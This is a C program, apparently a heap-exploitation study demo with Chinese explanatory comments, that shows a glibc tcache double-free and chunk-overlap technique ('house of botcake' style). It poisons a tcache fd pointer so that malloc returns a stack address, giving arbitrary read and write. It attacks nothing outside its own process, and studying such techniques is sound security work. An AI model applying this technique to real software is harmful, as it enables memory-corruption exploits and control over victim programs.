#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
//这个案例的主要思想是，通过double free造成tcachebin的第一个chunk和合并后的unsortedbin的第一个chunk中的空间有重叠，当下一次申请一个较大的空间时，
//就可能将重叠的部分也分配出去,对分配后的chunk的重叠部分进行操作就可以修改tcachebin对应链的第一个chunk的fd，造成任意地址分配，读写。

//把a所在chunk的fd指针所指向的栈地址分配出去，但是这里有个问题是，在构造得时候并没有构造栈上这个chunk的大小也就是c指针所指位置的前八个字节
//分配后这八个字节被填充成了指针b的值0x00007fffffffde40
int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    intptr_t stack_var[4];

    // prepare heap layout
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a);
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);

    // cause chunk overlapping
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    free(a);//这里a和prev的释放是没有先后顺序的，由于是再unsortedbin中都会合并（已测试）

    free(prev);

    malloc(0x100);//从tcachebin中分配第一个chunk，使得后面的double free会将a这个chunk放在首节点的位置，方便下一次直接拿到这个通过叠加部分修改后的chunk
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/

    // simple tcache poisoning
    intptr_t *b = malloc(0x120);
    b[0x120/8-2] = (long)stack_var;//直接修改了a所在chunk的fd指针，指到stack_var栈的位置

    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);//把a所在的chunk分配出去
   
    //把a所在chunk的fd指针所指向的栈地址分配出去，但是这里有个问题是，在构造得时候并没有构造栈上这个chunk的大小也就是c指针所指位置的前八个字节
    //分配后这八个字节被填充成了指针c的值0x00007fffffffde40
    //此时当我释放c时，程序出现问题，"double free or corruption (out)",说明构造不够完全
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);

    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");

    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");

    return 0;
}
